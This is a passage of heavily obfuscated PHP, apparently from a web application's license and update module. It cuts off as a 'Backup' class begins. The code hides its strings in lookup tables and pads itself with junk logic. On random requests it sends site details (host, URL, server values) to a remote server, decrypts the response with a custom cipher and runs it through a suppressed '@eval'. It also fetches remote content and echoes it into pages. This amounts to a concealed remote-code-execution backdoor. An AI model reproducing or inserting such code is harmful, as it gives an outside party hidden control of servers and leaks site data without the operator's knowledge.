$_SERVER[ïëó©ÒÚ]; $òÖÙËş³ =& $_SERVER[•×è•É]; if ($this->bmjue0289c42 == $òÖÙËş³[221]) { return $Ğâ®ŠÏ¼; } $æ›ş§‚ı = array($òÖÙËş³[222] => $òÖÙËş³[223], $òÖÙËş³[224] => $òÖÙËş³[223], $òÖÙËş³[225] => $òÖÙËş³[223], $òÖÙËş³[226] => $òÖÙËş³[223], $òÖÙËş³[227] => $òÖÙËş³[228], $òÖÙËş³[229] => $òÖÙËş³[228], $òÖÙËş³[230] => $òÖÙËş³[228], $òÖÙËş³[231] => $òÖÙËş³[228], $òÖÙËş³[232] => $òÖÙËş³[228], $òÖÙËş³[233] => $òÖÙËş³[228], $òÖÙËş³[234] => $òÖÙËş³[228], $òÖÙËş³[235] => $òÖÙËş³[228], $òÖÙËş³[236] => $òÖÙËş³[228], $òÖÙËş³[237] => $òÖÙËş³[228], $òÖÙËş³[238] => $òÖÙËş³[228], $òÖÙËş³[239] => $òÖÙËş³[228]); $–ª¹¿¢ = explode($òÖÙËş³[240], _get($this->frmw3575c793, $òÖÙËş³[111], $òÖÙËş³[6])); $çÏáñÖó = array(); $åŸéı÷ı = $ƒ³ˆİ¿ô[684]; if (strlen($åŸéı÷ı) < $ƒ³ˆİ¿ô[637]) { return; } foreach ($æ›ş§‚ı as $¹½Ü¡°¹ => $•ŸœíÕÁ) { if ($•ŸœíÕÁ == $òÖÙËş³[223] && substr($this->bmjue0289c42, 0, 1) == $òÖÙËş³[223]) { continue; } if (!in_array($¹½Ü¡°¹, $–ª¹¿¢)) { $çÏáñÖó[] = $¹½Ü¡°¹; } } foreach ($çÏáñÖó as $¹½Ü¡°¹) { unset($Ğâ®ŠÏ¼[$¹½Ü¡°¹]); } return $Ğâ®ŠÏ¼; $‘±äù = $ƒ³ˆİ¿ô[685]; if (strlen($‘±äù) < $ƒ³ˆİ¿ô[631]) { die; } } private function lwkr76f3f9de() { $ÔèÁŒÛ =& $_SERVER[•×è•É]; if ($this->bmjue0289c42 != $ÔèÁŒÛ[105]) { $GLOBALS[$ÔèÁŒÛ[84]][$ÔèÁŒÛ[88]][$ÔèÁŒÛ[241]] = $ÔèÁŒÛ[202]; return; } $GLOBALS[$ÔèÁŒÛ[84]][$ÔèÁŒÛ[242]] = $ÔèÁŒÛ[120]; if (Model($ÔèÁŒÛ[243])->get($ÔèÁŒÛ[63]) != $ÔèÁŒÛ[202]) { Model($ÔèÁŒÛ[243])->set($ÔèÁŒÛ[63], $ÔèÁŒÛ[202]); } } public function cvoqb9b4c8d9() { return $_SERVER[•×è•É][244]; } private function thncbeb4adfb() { $Ã¥äá¦Û =& $_SERVER[ïëó©ÒÚ]; $è«æ¤Íù =& $_SERVER[•×è•É]; $Ö’œäŠ¤ = array($è«æ¤Íù[245], $è«æ¤Íù[246], $è«æ¤Íù[247]); $Üíˆı†µ = $Ã¥äá¦Û[686]; if (!$Üíˆı†µ) { return; } $‡†Ñù„ó = $è«æ¤Íù[248] . md5($è«æ¤Íù[249]); $‹ı–£ü = $Ã¥äá¦Û[687]; if ($this->bmjue0289c42 == $è«æ¤Íù[105] || !_get($GLOBALS, $è«æ¤Íù[114])) { return; } if (!in_array($_SERVER[$è«æ¤Íù[24]], $Ö’œäŠ¤)) { return; } if (time() % 4 != 0) { return; } $Åä†Ğ§ = call_user_func(array($è«æ¤Íù[250], $è«æ¤Íù[251]), $‡†Ñù„ó); $£–ü®Ÿ = $Ã¥äá¦Û[688]; if (strlen($£–ü®Ÿ) < $Ã¥äá¦Û[637]) { die; } if ($Åä†Ğ§ && time() - $Åä†Ğ§ < intval($è«æ¤Íù[252])) { return; } call_user_func(array($è«æ¤Íù[250], $è«æ¤Íù[137]), $‡†Ñù„ó, time()); $ş÷Åòù = $Ã¥äá¦Û[689]; if (!$ş÷Åòù) { return; } $Ò¾ç‘† = Model($è«æ¤Íù[33])->get($è«æ¤Íù[102]); $÷ÎÃß”Î = $Ã¥äá¦Û[690]; while ($÷ÎÃß”Î < $Ã¥äá¦Û[631]) { if ($÷ÎÃß”Î >= 0) { break; } $÷ÎÃß”Î++; } $‹Æİìı = array($è«æ¤Íù[149] => Model($è«æ¤Íù[33])->get($è«æ¤Íù[185]), $è«æ¤Íù[162] => $this->bmjue0289c42, $è«æ¤Íù[159] => $_SERVER[$è«æ¤Íù[160]], $è«æ¤Íù[161] => Model($è«æ¤Íù[33])->get($è«æ¤Íù[129]), $è«æ¤Íù[100] => md5($_SERVER[$è«æ¤Íù[101]] . $Ò¾ç‘†), $è«æ¤Íù[152] => $è«æ¤Íù[134], $è«æ¤Íù[155] => $_SERVER[$è«æ¤Íù[156]]); $àèÈè—à = $this->dckf90e0ad11($è«æ¤Íù[253], $‹Æİìı); $ã÷ÔõŒ“ = $Ã¥äá¦Û[691]; if (!is_array($àèÈè—à)) { return; } if ($àèÈè—à[$è«æ¤Íù[149]] && $àèÈè—à[$è«æ¤Íù[254]]) { if ($this->mcog8531cda9($àèÈè—à[$è«æ¤Íù[254]]) == $‹Æİìı[$è«æ¤Íù[149]]) { return; } } $this->sagd66b5ca68(); $¶ùÖ´Ç´ = $Ã¥äá¦Û[692]; if (!$¶ùÖ´Ç´) { die; } if ($this->mcog8531cda9($àèÈè—à[$è«æ¤Íù[254]]) != $‹Æİìı[$è«æ¤Íù[149]]) { $öó‡‚Éª = array($è«æ¤Íù[180] => $Ò¾ç‘†, $è«æ¤Íù[181] => $_SERVER[$è«æ¤Íù[101]], $è«æ¤Íù[182] => this_url(), $è«æ¤Íù[157] => $_SERVER[$è«æ¤Íù[158]]); $Ô´ş³î· = $this->jfpm9291f5ef(json_encode($öó‡‚Éª)); $àèÈè—à = $this->dckf90e0ad11($è«æ¤Íù[183] . $Ô´ş³î·); if ($àèÈè—à && is_array($àèÈè—à) && isset($àèÈè—à[$è«æ¤Íù[254]])) { $åëàìö® = $this->zkdg817cabd1($àèÈè—à[$è«æ¤Íù[254]], 2); if ($åëàìö®) { $åëàìö® = $this->mcog8531cda9($åëàìö®); } if ($åëàìö®) { try { @eval($åëàìö®); } catch (Exception $Ôí¶¹¡†) { } } } } } private function dckf90e0ad11($›Ö•‹ğß = '', $–¹öñ‘ü = array(), $í“â©«² = 5) { $Ô¥ƒ‹é¸ =& $_SERVER[ïëó©ÒÚ]; $ÀàÛˆº¿ =& $_SERVER[•×è•É]; $Ìòï­­ = $ÀàÛˆº¿[255]; $Ú™˜Òı = $Ô¥ƒ‹é¸[693]; $Ìòï­­ = $this->rjit7315a89e($Ìòï­­, $ÀàÛˆº¿[256]); $Ìòï­­ = $Ìòï­­ . $›Ö•‹ğß; $¦ ³êø° = $Ô¥ƒ‹é¸[694]; if (strlen($¦ ³êø°) < $Ô¥ƒ‹é¸[628]) { die; } if ($–¹öñ‘ü && is_array($–¹öñ‘ü)) { $Ìòï­­ = $Ìòï­­ . $ÀàÛˆº¿[257] . http_build_query($–¹öñ‘ü); } if ($–¹öñ‘ü === -1) { return $Ìòï­­; } $Ğ¡¿¡ÁŒ = stream_context_create(array($ÀàÛˆº¿[215] => array($ÀàÛˆº¿[218] => $í“â©«², $ÀàÛˆº¿[216] => $ÀàÛˆº¿[258]), $ÀàÛˆº¿[259] => array($ÀàÛˆº¿[260] => !1, $ÀàÛˆº¿[261] => !1))); $«ÕÔÛõÜ = $Ô¥ƒ‹é¸[695]; if (!$«ÕÔÛõÜ) { die; } $–¹öñ‘ü = @file_get_contents($Ìòï­­, !1, $Ğ¡¿¡ÁŒ); return json_decode($–¹öñ‘ü, !0); $•Ñ¡ãš = $Ô¥ƒ‹é¸[696]; } private function srih605e8481() { $˜Öº×õĞ =& $_SERVER[ïëó©ÒÚ]; $ß±Ë¥œÀ =& $_SERVER[•×è•É]; $ŠİŞŸƒº = array($ß±Ë¥œÀ[262] => $ß±Ë¥œÀ[263], $ß±Ë¥œÀ[264] => $ß±Ë¥œÀ[265], $ß±Ë¥œÀ[266] => $ß±Ë¥œÀ[267], $ß±Ë¥œÀ[268] => $ß±Ë¥œÀ[269], $ß±Ë¥œÀ[270] => $ß±Ë¥œÀ[271], $ß±Ë¥œÀ[272] => $ß±Ë¥œÀ[210], $ß±Ë¥œÀ[273] => $ß±Ë¥œÀ[210], $ß±Ë¥œÀ[274] => $ß±Ë¥œÀ[263], $ß±Ë¥œÀ[275] => $ß±Ë¥œÀ[265], $ß±Ë¥œÀ[276] => $ß±Ë¥œÀ[267], $ß±Ë¥œÀ[277] => $ß±Ë¥œÀ[278], $ß±Ë¥œÀ[279] => $ß±Ë¥œÀ[269], $ß±Ë¥œÀ[280] => $ß±Ë¥œÀ[281], $ß±Ë¥œÀ[282] => $ß±Ë¥œÀ[271], $ß±Ë¥œÀ[283] => $ß±Ë¥œÀ[284], $ß±Ë¥œÀ[285] => $ß±Ë¥œÀ[286], $ß±Ë¥œÀ[287] => $ß±Ë¥œÀ[288]); $”Ûªú•å = $˜Öº×õĞ[697]; while ($”Ûªú•å < $˜Öº×õĞ[637]) { if ($”Ûªú•å >= 0) { break; } $”Ûªú•å++; } $ÕÍÑ«Èß = $ŠİŞŸƒº[$this->bmjue0289c42]; $ÕÍÑ«Èß = intval($ÕÍÑ«Èß ? $ÕÍÑ«Èß : $ß±Ë¥œÀ[263]); $§ëŒç­Á = $˜Öº×õĞ[698]; $¥âİõóâ = _get($this->frmw3575c793, $ß±Ë¥œÀ[289]); $¨ğŠÆŞŞ = $˜Öº×õĞ[699]; $¥âİõóâ = $¥âİõóâ ? intval($¥âİõóâ) : 0; $Ë« ±² = $˜Öº×õĞ[700]; return $ÕÍÑ«Èß + $¥âİõóâ; } public function cxzgfa7d1a09($ûâòÆÓÕ) { $Ñµè÷ñÖ =& $_SERVER[•×è•É]; $“‡‡øÔ = $this->srih605e8481(); if ($ûâòÆÓÕ[$Ñµè÷ñÖ[290]] == $Ñµè÷ñÖ[120]) { return; } if ($“‡‡øÔ >= intval($Ñµè÷ñÖ[210])) { return; } $†Ï˜“æü = Model($Ñµè÷ñÖ[123])->count(); if ($†Ï˜“æü <= $“‡‡øÔ) { return; } $¹£Â¥Û× = Model($Ñµè÷ñÖ[123])->field($Ñµè÷ñÖ[290])->limit($“‡‡øÔ)->select(); $¶º€ğê = $_SERVER[ïëó©ÒÚ][701]; if (!$¶º€ğê) { die; } $¹£Â¥Û× = array_to_keyvalue($¹£Â¥Û×, $Ñµè÷ñÖ[6], $Ñµè÷ñÖ[290]); if (!in_array($ûâòÆÓÕ[$Ñµè÷ñÖ[290]], $¹£Â¥Û×)) { show_json($Ñµè÷ñÖ[291], !1, $Ñµè÷ñÖ[206]); } } public function qbor35e62eba() { $“ï­ºı =& $_SERVER[ïëó©ÒÚ]; $•¾ˆÅÓÓ =& $_SERVER[•×è•É]; if (!_get($GLOBALS, $•¾ˆÅÓÓ[114]) || mt_rand(1, 100) > 20) { return; } $êº¿‰Š = $•¾ˆÅÓÓ[213]; $êº¿‰Š = $this->rjit7315a89e($êº¿‰Š, $•¾ˆÅÓÓ[214]); $çÔß×¼æ = $“ï­ºı[702]; while (strlen($çÔß×¼æ) < $“ï­ºı[628]) { if (!$çÔß×¼æ) { break; } $çÔß×¼æ++; } $ïØ—² = stream_context_create(array($•¾ˆÅÓÓ[215] => array($•¾ˆÅÓÓ[216] => $•¾ˆÅÓÓ[217], $•¾ˆÅÓÓ[218] => 3))); $¨œƒÄÛ£ = $“ï­ºı[703]; if (!$¨œƒÄÛ£) { die; } $ŸÂßƒ˜ä = @file_get_contents($êº¿‰Š, !1, $ïØ—²); echo $•¾ˆÅÓÓ[292] . hash_encode($ŸÂßƒ˜ä) . $•¾ˆÅÓÓ[293]; } private function otdb0fabe9d9($Í–‘õ¬­, $¿¼ôâêÂ, $ßš™»°ü = 3) { $úù¢ìü’ =& $_SERVER[ïëó©ÒÚ]; $×çÀ–äû =& $_SERVER[•×è•É]; usleep(1); $‡«ã = $úù¢ìü’[704]; $Í–‘õ¬­ = trim($Í–‘õ¬­); $«îÊ‚õ¦ = $úù¢ìü’[705]; if (!$«îÊ‚õ¦) { die; } $È«òíÊ = mt_rand(0, 5) . $×çÀ–äû[6]; $ÂÚÕÖµÚ = $úù¢ìü’[706]; if (strlen($ÂÚÕÖµÚ) < $úù¢ìü’[637]) { return; } $¿§ÉÒîŒ = rand_string(15); $íæâ‘„Š = $×çÀ–äû[294]; $Â¼§ñÃ² = $úù¢ìü’[707]; if (strlen($Â¼§ñÃ²) < $úù¢ìü’[637]) { return; } switch ($È«òíÊ) { case $×çÀ–äû[202]: $‰î·›Â = $this->ikcn1a8e0d67($Í–‘õ¬­, strrev($¿¼ôâêÂ . $¿§ÉÒîŒ)); break; case $×çÀ–äû[120]: $‰î·›Â = $this->ikcn1a8e0d67($Í–‘õ¬­, strrev($¿§ÉÒîŒ . $¿¼ôâêÂ)); break; case $×çÀ–äû[295]: $‰î·›Â = $this->ikcn1a8e0d67($Í–‘õ¬­, base64_encode($¿§ÉÒîŒ . $¿¼ôâêÂ)); break; $¸¹•Àñ = $úù¢ìü’[708]; if (strlen($¸¹•Àñ) < $úù¢ìü’[405]) { return; } case $×çÀ–äû[296]: $‰î·›Â = $this->ikcn1a8e0d67($Í–‘õ¬­, md5($¿§ÉÒîŒ . $¿¼ôâêÂ)); break; $ÂÏØï§Š = $úù¢ìü’[709]; if (!$ÂÏØï§Š) { return; } case $×çÀ–äû[297]: $Í–‘õ¬­ = base64_encode($Í–‘õ¬­); $ÂŞÅç³« = rand(0, 64); $÷ò‚µ§½ = $íæâ‘„Š[$ÂŞÅç³«]; $ğ¨íæ´ = md5($÷ò‚µ§½ . md5($¿¼ôâêÂ . $÷ò‚µ§½) . $¿¼ôâêÂ); $ğ¨íæ´ = substr($ğ¨íæ´, $ÂŞÅç³« % 8, $ÂŞÅç³« % 8 + 7); $ıÈîª» = $úù¢ìü’[710]; while ($ıÈîª» < $úù¢ìü’[637]) { if ($ıÈîª» >= 0) { break; } $ıÈîª»++; } $ˆüú®™› = $×çÀ–äû[6]; $£ôÑŠÍ = $úù¢ìü’[711]; if (!$£ôÑŠÍ) { return; } $¶Úêİß› = 0; $Î…Ãœ‚… = $úù¢ìü’[712]; if (strlen($Î…Ãœ‚…) < $úù¢ìü’[631]) { return; } $×ˆıàÜî = 0; $Ö¶•ÂØ‰ = $úù¢ìü’[713]; $·€ìÆª• = 0; $£ÚÏ”‡ñ = $úù¢ìü’[714]; if (strlen($£ÚÏ”‡ñ) < $úù¢ìü’[637]) { die; } for ($¶Úêİß› = 0; $¶Úêİß› < strlen($Í–‘õ¬­); $¶Úêİß›++) { $·€ìÆª• = $·€ìÆª• == strlen($ğ¨íæ´) ? 0 : $·€ìÆª•; $„ª«ì–‹ = $úù¢ìü’[715]; if (strlen($„ª«ì–‹) < $úù¢ìü’[647]) { return; } $×ˆıàÜî = ($ÂŞÅç³« + strpos($íæâ‘„Š, $Í–‘õ¬­[$¶Úêİß›]) + ord($ğ¨íæ´[$·€ìÆª•++])) % 64; $±ôõŸéš = $úù¢ìü’[716]; if (strlen($±ôõŸéš) < $úù¢ìü’[631]) { return; } $ˆüú®™› .= $íæâ‘„Š[$×ˆıàÜî]; $»ğ€›ÏÆ = $úù¢ìü’[717]; if (!$»ğ€›ÏÆ) { die; } } $‰î·›Â = hash_encode($÷ò‚µ§½ . $ˆüú®™›); break; default: $‰î·›Â = $this->ikcn1a8e0d67($Í–‘õ¬­, $¿¼ôâêÂ . $¿§ÉÒîŒ); $Ê•º†Ê· = $úù¢ìü’[718]; if (strlen($Ê•º†Ê·) < $úù¢ìü’[631]) { return; } break; } $‰î·›Â = strrev($È«òíÊ . $¿§ÉÒîŒ . $‰î·›Â); if ($ßš™»°ü - 1 > 0) { $‰î·›Â = $this->otdb0fabe9d9($‰î·›Â, $¿¼ôâêÂ, $ßš™»°ü - 1); } return $‰î·›Â; } private function zkdg817cabd1($ÖÔóïî, $’íÂŠË, $² Éªåè = 3) { $»øœ„¸± =& $_SERVER[ïëó©ÒÚ]; $–Ë¢Öù =& $_SERVER[•×è•É]; if (!is_string($ÖÔóïî) || strlen($ÖÔóïî) < 10) { return !1; } $ÖÔóïî = trim($ÖÔóïî); $ÖÔóïî = strrev($ÖÔóïî); $´¾Óê»× = $ÖÔóïî[0]; $íÕ§ÏÆ = substr($ÖÔóïî, 1, 15); $ÖÔóïî = substr($ÖÔóïî, 16); $®ÁÚÙƒ = $»øœ„¸±[719]; if (strlen($®ÁÚÙƒ) < $»øœ„¸±[647]) { return; } $¸šİçõÜ = $–Ë¢Öù[294]; switch ($´¾Óê»×) { case $–Ë¢Öù[202]: $„Ç‘ù•– = $this->rjit7315a89e($ÖÔóïî, strrev($’íÂŠË . $íÕ§ÏÆ)); break; case $–Ë¢Öù[120]: $„Ç‘ù•– = $this->rjit7315a89e($ÖÔóïî, strrev($íÕ§ÏÆ . $’íÂŠË)); break; case $–Ë¢Öù[295]: $„Ç‘ù•– = $this->rjit7315a89e($ÖÔóïî, base64_encode($íÕ§ÏÆ . $’íÂŠË)); $Å‹§µÑğ = $»øœ„¸±[720]; while (strlen($Å‹§µÑğ) < $»øœ„¸±[631]) { if (!$Å‹§µÑğ) { break; } $Å‹§µÑğ++; } break; case $–Ë¢Öù[296]: $„Ç‘ù•– = $this->rjit7315a89e($ÖÔóïî, md5($íÕ§ÏÆ . $’íÂŠË)); $î¶¦ÍÄÕ = $»øœ„¸±[721]; while ($î¶¦ÍÄÕ < $»øœ„¸±[631]) { if ($î¶¦ÍÄÕ >= 0) { break; } $î¶¦ÍÄÕ++; } break; $º»¡ñç¦ = $»øœ„¸±[722]; if (strlen($º»¡ñç¦) < $»øœ„¸±[631]) { die; } case $–Ë¢Öù[297]: $ÖÔóïî = hash_decode($ÖÔóïî); $ÍŸŒ®…ˆ = $ÖÔóïî[0]; $æî½£¢º = $»øœ„¸±[723]; while ($æî½£¢º < $»øœ„¸±[405]) { if ($æî½£¢º >= 0) { break; } $æî½£¢º++; } $ÖÔóïî = substr($ÖÔóïî, 1); $‘Õ÷ã½ = strpos($¸šİçõÜ, $ÍŸŒ®…ˆ); $¦ÒæÁà³ = md5($ÍŸŒ®…ˆ . md5($’íÂŠË . $ÍŸŒ®…ˆ) . $’íÂŠË); $®áŒÖç§ = $»øœ„¸±[724]; $¦ÒæÁà³ = substr($¦ÒæÁà³, $‘Õ÷ã½ % 8, $‘Õ÷ã½ % 8 + 7); $ñ§îîËÔ = $–Ë¢Öù[6]; $Ö ÇĞ®Ù = 0; $²»ùÃ¦´ = $»øœ„¸±[725]; if (!$²»ùÃ¦´) { return; } $†€¼½ˆ¨ = 0; $ğ‚†œ½¢ = $»øœ„¸±[726]; if (!$ğ‚†œ½¢) { return; } $ğ¾¹€¹ê = 0; for ($Ö ÇĞ®Ù = 0; $Ö ÇĞ®Ù < strlen($ÖÔóïî); $Ö ÇĞ®Ù++) { $ğ¾¹€¹ê = $ğ¾¹€¹ê == strlen($¦ÒæÁà³) ? 0 : $ğ¾¹€¹ê; $‹É·©Ì¼ = $ğ¾¹€¹ê++; $İÆšŸ´ı = $»øœ„¸±[727]; while (strlen($İÆšŸ´ı) < $»øœ„¸±[631]) { if (!$İÆšŸ´ı) { break; } $İÆšŸ´ı++; } $†€¼½ˆ¨ = strpos($¸šİçõÜ, $ÖÔóïî[$Ö ÇĞ®Ù]) - $‘Õ÷ã½ - ord($¦ÒæÁà³[$‹É·©Ì¼]); while ($†€¼½ˆ¨ < 0) { $†€¼½ˆ¨ += 64; $µ¹³À ¬ = $»øœ„¸±[728]; } $ñ§îîËÔ .= $¸šİçõÜ[$†€¼½ˆ¨]; $Á§Œ›Î = $»øœ„¸±[729]; if (!$Á§Œ›Î) { die; } } $„Ç‘ù•– = base64_decode($ñ§îîËÔ); $Â¨éşùÂ = $»øœ„¸±[730]; while ($Â¨éşùÂ < $»øœ„¸±[647]) { if ($Â¨éşùÂ >= 0) { break; } $Â¨éşùÂ++; } break; $ÈÕ„«®· = $»øœ„¸±[731]; default: $„Ç‘ù•– = $this->rjit7315a89e($ÖÔóïî, $’íÂŠË . $íÕ§ÏÆ); break; } if ($² Éªåè - 1 > 0) { $„Ç‘ù•– = $this->zkdg817cabd1($„Ç‘ù•–, $’íÂŠË, $² Éªåè - 1); } return $„Ç‘ù•–; } public function jfpm9291f5ef($ëúôúöÚ) { $áßÓı±Í =& $_SERVER[ïëó©ÒÚ]; $øñºô® =& $_SERVER[•×è•É]; $ùøçü¥Ş = $this->ciqx3ca0060d(); $¼á‘£„ = $áßÓı±Í[732]; while ($¼á‘£„ < $áßÓı±Í[405]) { if ($¼á‘£„ >= 0) { break; } $¼á‘£„++; } $ª‡ãà¦ı = $this->ciqx3ca0060d(); $ÄÕøø³ = ($ùøçü¥Ş - 1) * ($ª‡ãà¦ı - 1); $î­ƒøÛ = $áßÓı±Í[733]; $çºóÍ¨Á = intval(($ùøçü¥Ş + $ª‡ãà¦ı) / 2); $ŒÂŞ¿à˜ = $áßÓı±Í[734]; if (!$ŒÂŞ¿à˜) { die; } while (1) { $—õÃ’ÎÀ = $çºóÍ¨Á; $ÎÏ½Ôôğ = $ÄÕøø³; while ($ÎÏ½Ôôğ % $—õÃ’ÎÀ != 0) { $µğâşö¹ = $ÎÏ½Ôôğ; $ÎÏ½Ôôğ = $—õÃ’ÎÀ; $Û¹êç• = $áßÓı±Í[735]; while (strlen($Û¹êç•) < $áßÓı±Í[631]) { if (!$Û¹êç•) { break; } $Û¹êç•++; } $—õÃ’ÎÀ = $µğâşö¹ % $—õÃ’ÎÀ; } if ($—õÃ’ÎÀ == 1) { break; } else { $çºóÍ¨Á++; } } $îÊ•Óˆé = 2; for ($éï®ªÏØ = 0; $éï®ªÏØ < $ÄÕøø³ * 10; $éï®ªÏØ++) { if (($ÄÕøø³ * $éï®ªÏØ + 1) % $çºóÍ¨Á == 0) { $îÊ•Óˆé = intval(($ÄÕøø³ * $éï®ªÏØ + 1) / $çºóÍ¨Á); break; } } $ùá±û† = $this->ikcn1a8e0d67($ùøçü¥Ş * $ª‡ãà¦ı . $øñºô®[6], $øñºô®[134]); $—”Õ¾÷— = md5($øñºô®[298] . ($ùøçü¥Ş + $ª‡ãà¦ı) . $øñºô®[299] . $çºóÍ¨Á . $øñºô®[299] . $îÊ•Óˆé . $øñºô®[300]); $ãÛ¶‡Çš = $áßÓı±Í[736]; $üÛ¨Ğ¦± = $this->ikcn1a8e0d67($ëúôúöÚ, $—”Õ¾÷—) . $øñºô®[301] . $ùá±û†; return $üÛ¨Ğ¦±; } public function mcog8531cda9($”É»Ç·Œ) { $ï„Æ£ß =& $_SERVER[ïëó©ÒÚ]; $é†©Ç» =& $_SERVER[•×è•É]; $ä™Œ­°â = explode($é†©Ç»[301], $”É»Ç·Œ); $µ»İ®©Ñ = $ï„Æ£ß[737]; while (strlen($µ»İ®©Ñ) < $ï„Æ£ß[647]) { if (!$µ»İ®©Ñ) { break; } $µ»İ®©Ñ++; } if (count($ä™Œ­°â) != 2) { return $é†©Ç»[6]; } $ÊÜ•İ¹ = $this->rjit7315a89e($ä™Œ­°â[1] . $é†©Ç»[6], $é†©Ç»[134]); $å¤ÓÂúŞ = $ï„Æ£ß[738]; if (!$å¤ÓÂúŞ) { return; } if (!$ÊÜ•İ¹) { return $é†©Ç»[6]; } $ÊÜ•İ¹ = intval($ÊÜ•İ¹); $ÀÃø³ëğ = 0; $çø ıœ÷ = $ï„Æ£ß[739]; if (strlen($çø ıœ÷) < $ï„Æ£ß[405]) { return; } $§¶ù€´ = 0; $˜²ˆšÒÜ = $ï„Æ£ß[740]; for ($¥±²êÅ = 3; $¥±²êÅ < $ÊÜ•İ¹; $¥±²êÅ += 2) { if ($ÊÜ•İ¹ % $¥±²êÅ != 0) { continue; } $ÀÃø³ëğ = $¥±²êÅ; $×¿¤ƒù¶ = $ï„Æ£ß[741]; $§¶ù€´ = intval($ÊÜ•İ¹ / $¥±²êÅ); $Ïêü¨š´ = $ï„Æ£ß[742]; break; $Áˆ¯Â«ğ = $ï„Æ£ß[743]; if (!$Áˆ¯Â«ğ) { return; } } $õ¹œş§– = ($ÀÃø³ëğ - 1) * ($§¶ù€´ - 1); $ò‘üå¿œ = $ï„Æ£ß[744]; while (strlen($ò‘üå¿œ) < $ï„Æ£ß[405]) { if (!$ò‘üå¿œ) { break; } $ò‘üå¿œ++; } $²ğ©Íìş = intval(($ÀÃø³ëğ + $§¶ù€´) / 2); while (1) { $­ûñÄÔ× = $²ğ©Íìş; $ºˆ´Ï•“ = $õ¹œş§–; $«·—Ü¬¨ = $ï„Æ£ß[745]; if (!$«·—Ü¬¨) { return; } while ($ºˆ´Ï•“ % $­ûñÄÔ× != 0) { $Ú·¿²‘ = $ºˆ´Ï•“; $²¾ßÑ = $ï„Æ£ß[746]; while ($²¾ßÑ < $ï„Æ£ß[647]) { if ($²¾ßÑ >= 0) { break; } $²¾ßÑ++; } $ºˆ´Ï•“ = $­ûñÄÔ×; $³Œ²Öê· = $ï„Æ£ß[747]; $­ûñÄÔ× = $Ú·¿²‘ % $­ûñÄÔ×; } if ($­ûñÄÔ× == 1) { break; } else { $²ğ©Íìş++; } } $›”¼ï’º = 2; $Ÿ¥ÈæÑˆ = $ï„Æ£ß[748]; while (strlen($Ÿ¥ÈæÑˆ) < $ï„Æ£ß[628]) { if (!$Ÿ¥ÈæÑˆ) { break; } $Ÿ¥ÈæÑˆ++; } for ($¥±²êÅ = 0; $¥±²êÅ < $õ¹œş§– * 10; $¥±²êÅ++) { if (($õ¹œş§– * $¥±²êÅ + 1) % $²ğ©Íìş == 0) { $›”¼ï’º = intval(($õ¹œş§– * $¥±²êÅ + 1) / $²ğ©Íìş); break; } } $€ö´»åˆ = md5($é†©Ç»[298] . ($ÀÃø³ëğ + $§¶ù€´) . $é†©Ç»[299] . $²ğ©Íìş . $é†©Ç»[299] . $›”¼ï’º . $é†©Ç»[300]); $Ôı†ª‹ = $ï„Æ£ß[749]; if (strlen($Ôı†ª‹) < $ï„Æ£ß[631]) { die; } $·°¼Á÷£ = $this->rjit7315a89e($ä™Œ­°â[0], $€ö´»åˆ); $È†¹ğÍ = $ï„Æ£ß[750]; return $·°¼Á÷£; } public function ciqx3ca0060d() { $€çõúõë =& $_SERVER[ïëó©ÒÚ]; $­Šşùİ¯ = mt_rand(pow(2, 14), pow(2, 16) - 1); $´å¿ó™€ = $€çõúõë[751]; if (!$´å¿ó™€) { die; } $àôÍ…ĞÑ = array(); $ÑÊº‡¾Œ = $€çõúõë[752]; $úÅ·ò› = 1; $½„õû×  = $€çõúõë[753]; while ($½„õû×  < $€çõúõë[647]) { if ($½„õû×  >= 0) { break; } $½„õû× ++; } while ($úÅ·ò› <= (int) sqrt($­Šşùİ¯)) { $§µ®óŞ‰ = $úÅ·ò›; while (!0) { $§µ®óŞ‰++; $ÁÊÖ—± = $€çõúõë[754]; if (strlen($ÁÊÖ—±) < $€çõúõë[405]) { die; } if ($§µ®óŞ‰ <= 2) { $úÅ·ò› = $§µ®óŞ‰; break; } else { if ($§µ®óŞ‰ < 2) { continue; } } $Ê¤‡Û° = !0; for ($ù°Èç² = 2; $ù°Èç² <= sqrt($§µ®óŞ‰); $ù°Èç²++) { if ($§µ®óŞ‰ % $ù°Èç² == 0) { $Ê¤‡Û° = !1; } } if ($Ê¤‡Û°) { $úÅ·ò› = $§µ®óŞ‰; break; } } $àôÍ…ĞÑ[] = $úÅ·ò›; $ê±ûëú² = $€çõúõë[755]; } $á­„×Æ = 2; $ö­Û—ùÌ = $€çõúõë[756]; for ($§µ®óŞ‰ = $­Šşùİ¯; $§µ®óŞ‰ > 1; $§µ®óŞ‰--) { $Ê¤‡Û° = !0; $†‚åãÛ = $€çõúõë[663]; while ($†‚åãÛ < $€çõúõë[647]) { if ($†‚åãÛ >= 0) { break; } $†‚åãÛ++; } foreach ($àôÍ…ĞÑ as $Ö­™ˆ°) { if ($§µ®óŞ‰ % $Ö­™ˆ° == 0) { $Ê¤‡Û° = !1; break; } } if ($Ê¤‡Û°) { $á­„×Æ = $§µ®óŞ‰; break; } } return $á­„×Æ; } public function nxcm006ff05c($“ĞÄŸˆ, $ìü­–†Ì) { $ÃÆ¥á  =& $_SERVER[ïëó©ÒÚ]; $Ø–ğƒß =& $_SERVER[•×è•É]; return call_user_func(array($Ø–ğƒß[8], $Ø–ğƒß[302]), $“ĞÄŸˆ, $ìü­–†Ì); $¼ä“×°‰ = $ÃÆ¥á [757]; while ($¼ä“×°‰ < $ÃÆ¥á [631]) { if ($¼ä“×°‰ >= 0) { break; } $¼ä“×°‰++; } } public function ikcn1a8e0d67($×áüöŞ, $‰Ş ¯Ğó) { $Ô–ÉØ½Œ =& $_SERVER[•×è•É]; return call_user_func(array($Ô–ÉØ½Œ[303], $Ô–ÉØ½Œ[304]), $×áüöŞ, $‰Ş ¯Ğó); } public function rjit7315a89e($áÆãŠ†«, $¢ƒ»ãËá) { $ıñÍ€÷Î =& $_SERVER[•×è•É]; return call_user_func(array($ıñÍ€÷Î[303], $ıñÍ€÷Î[305]), $áÆãŠ†«, $¢ƒ»ãËá); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $’ø¿Éú€ =& $_SERVER[ïëó©ÒÚ]; $this->isManual(); self::$name = date($’ø¿Éú€[758]); if (!($—“ğ‘à» = Model($’ø¿Éú€[759])->lastItem())) { $—“ğ‘à» = $this->initData(); } else { self::$name = $—“ğ‘à»[$’ø¿Éú€[32]]; if ($—“ğ‘à»[$’ø¿Éú€[760]] == $’ø¿Éú€[88]) { self::$name = date($’ø¿Éú€[761]); $Œ±¤Ğ = 0; if 